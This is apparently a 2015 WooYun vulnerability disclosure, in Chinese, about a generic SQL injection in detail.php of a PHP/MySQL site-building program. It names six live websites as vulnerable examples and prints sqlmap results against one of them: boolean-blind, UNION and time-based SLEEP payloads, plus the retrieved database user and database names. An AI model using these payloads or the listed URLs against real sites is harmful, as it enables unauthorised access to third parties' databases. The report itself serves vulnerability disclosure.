wybug_title: 某建站程序通用型SQL注入#1

wybug_detail: 漏洞详情 披露状态：   									2015-01-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-04-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL 详细说明：  注入   漏洞证明：  1、建站程序类型：php+mysql2、漏洞类型：SQL注入3、缺陷文件：detail.php4、注入参数：id5、涉及版本：全部7、危害程度：高危8、涉及厂商：宏云浩海（北京）科技有限公司9、厂商网站：www.bj-cloud.com10、安装量：超大11、是否拥有源代码分析：暂无12、是否默认配置：是案例如下:http://www.cnpamirs.com/ch/detail.php?id=1&zid=4&infoid=13&en=c id=1http://www.taidesteel.com/en/detail.php?id=2&infoid=7&en=c id=2http://www.kdw.com.cn/ch/detail.php?id=7&infoid=10&en=c infoid=10http://web440507.dnsvhost.com/ch/detail.php?id=1&zid=4&infoid=13&en=c id=1http://taidesteelmesh.com/ch/detail.php?id=5&zid=15&en=chttp://ruika-sh.com/ch/detail.php?id=3&infoid=5&en=c infoid=5测试第一处！sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 2905=2905&zid=4&infoid=13&en=c id=1 AND 2905=2905    Type: UNION query    Title: MySQL UNION query (NULL) - 29 columns    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171627871,0x69766c48424b6f6c5653,0x7163616d71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&zid=4&infoid=13&en=c id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171627871,0x69766c48424b6f6c5653,0x7163616d71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=1 AND SLEEP(5)&zid=4&infoid=13&en=c id=1 AND SLEEP(5)---[16:11:02] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.2.17back-end DBMS: MySQL 5.0.11[16:11:02] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\www.cnpamirs.com'[*] shutting down at 16:11:02current user:    'web440507@%'current database:    'db_web440507'available databases [2]:[*] db_web440507[*] information_schema   修复方案：  过滤！   版权声明：转载请注明来源 YuShen@乌云
